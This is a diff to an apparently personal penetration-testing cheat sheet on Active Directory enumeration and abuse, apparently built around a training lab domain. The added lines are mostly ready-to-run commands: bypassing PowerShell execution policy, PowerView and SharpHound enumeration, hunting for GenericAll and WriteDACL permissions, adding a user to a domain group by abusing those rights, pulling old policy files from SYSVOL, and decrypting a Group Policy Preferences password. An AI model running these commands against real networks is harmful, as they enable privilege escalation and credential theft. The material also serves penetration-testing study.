@@ -54,19 +54,18 @@ There are several key pieces of information we should always obtain:
 > Get-ChildItem -Path C:\ -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > Get-History
 > (Get-PSReadlineOption).HistorySavePath
+# We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
+> setspn -L iis_service # or any server,client you discover
 ```
-Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ppkg,*.pdf -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\ -Include *.txt,*.pdf -File -Recurse -ErrorAction SilentlyContinue | type
-Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ppkg,*.pdf -File -Recurse -ErrorAction SilentlyContinue | type | Select-String -Pattern "special password" -Context 10,10
-### Powerview
 
-*In the command prompt
+### PowerView.ps1
+
 ```bash
 # This will allow you to run scripts
 powershell -ep bypass
 ...
 # Load PowerView (once it's already installed)
-> . ./PowerView.ps1
+> . ./PowerView.ps1 # or Import-Module C:\\Tools\PowerView.ps1
 # See the structure
 > Get-NetDomain
 # Get the domain controller IP, possibly end target
@@ -78,13 +77,18 @@ powershell -ep bypass
 # Information about the user you have access to, can be a lot of information
 > Get-NetUser
 # Only pull down the usernames
-> Get-NetUser | select samaccountname
-# See when the users last changed their passwords
+> Get-NetUser | select samaccountname # or select cn
+# See when the users last changed their passwords, if before policy change, may be weaker
 > Get-UserProperty -Properties pwdlastset
 # See how many times each user has logged on, great way to identify honeypot accounts
 > Get-UserProperty -Properties logoncount
+# Enumerate the computer objects
+> Get-NetComputer
 # Get a ton of information about the computers
 > Get-NetComputer -FullData # '| select {propertyName}' in order to nail down certain information, such as operating system
+> Get-NetComputer | select operatingsystem,dnshostname # It's a good idea to grab this information early in the assessment to determine the relative age of the systems and to locate potentially weak targets.
+# Enumerate groups
+> Get-NetGroup | select cn
 # See who are admins
 > Get-NetGroupMember -GroupName *admin*
 # Look through the different shares
@@ -93,7 +97,72 @@ powershell -ep bypass
 > Get-NetGPO
 # Narrowing down the above
 > Get-NetGPO | select displayname, whenchanged
+# Find out if you have admin privileges on any computers in the domain
+> Find-LocalAdminAccess # May take a few minutes
+# See who's logged in & other info
+> Get-NetSession -ComputerName files04 -Verbose # Untrustable on Windows 11
+# We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan
+> Get-NetUser -SPN | select samaccountname,serviceprincipalname
+# Attempt to resolve SPN's IP
+> nslookup.exe web04.corp.com # Typically located in C:\Tools\
+# Enumerate ACEs, filtering on an identity
+> Get-ObjectAcl -Identity stephanie # Look for AD Rights, SIDs. SID2 has AD Rights to SID1
+# Convert SIDs to domain object name
+> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+# Clean output, look for all users with General All Rights for "Management Department"
+> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights # Can also do this for GenericWrite,WriteOwner,WriteDACL,AllExtendedRights,ForceChangePassword,Self (Self-Membership)
+# Convert multiple SIDs to readable objects at once
+> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName # If a regular user has these rights, this is likely a misconfiguration.. and should be prioritized
+# Find shares in the domain
+> Find-DomainShare # -CheckShareAccess to only display shares available to us
+> ls \\dc1.corp.com\sysvol\corp.com\
+> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+```
 
+### SharpHound.ps1 && BloodHound.ps1
+
+Note that SharpHound supports looping, running cyclical queries over time like a cron job, which will gather additional data such as environment changes, new log-ons.
+
+```bash
+> . .\Sharphound.ps1 # or Import-Module .\Sharphound.ps1
+> Get-Help Invoke-BloodHound
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\ -OutputPrefix "corp audit" # May take a couple minutes
+```
+
+```bash
+kali@kali:~$ sudo neo4j start
+# Go to http://localhost:7474 and login with default credentials
+kali@kali:~$ bloodhound
+```
+
+Remember to mark the computers that you own!!!!!
+
+It's a good idea to mark every object we have access to as owned to improve our visibility into more potential attack vectors. There may be a short path to our goals that hinges on ownership of a particular object.
+
+#### Who is logged on?
+
+Use PsLoggedon.exe if it's an older machine, such as Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2). Don't trust it if it says that nobody is logged on, but trust it if it says there is somebody.
+
+```bash
+.\\PsLoggedOn.exe \\file04
+```
+
+#### Interesting Object Permissions
+
+AD includes a wealth of permission types that can be used to configure an ACE. However, from an attacker's standpoint, we are mainly interested in a few key permission types. Here's a list of the most interesting ones along with a description of the permissions they provide:
+
+	GenericAll: Full permissions on object
+	GenericWrite: Edit certain attributes on the object
+	WriteOwner: Change ownership of the object
+	WriteDACL: Edit ACE's applied to object
+	AllExtendedRights: Change password, reset password, etc.
+	ForceChangePassword: Password change for object
+	Self (Self-Membership): Add ourselves to for example a group
+
+Example abuse:
+
+```bash
+net group "Management Department" stephanie /add /domain
 ```
 
 #### enum4linux
@@ -554,3 +623,9 @@ whoami # Verify that it worked, that you are not NT AUTHORITY\SYSTEM
 ```
 
 There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.
+
+#### Decrypt GPP Password
+
+```bash
+kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+```
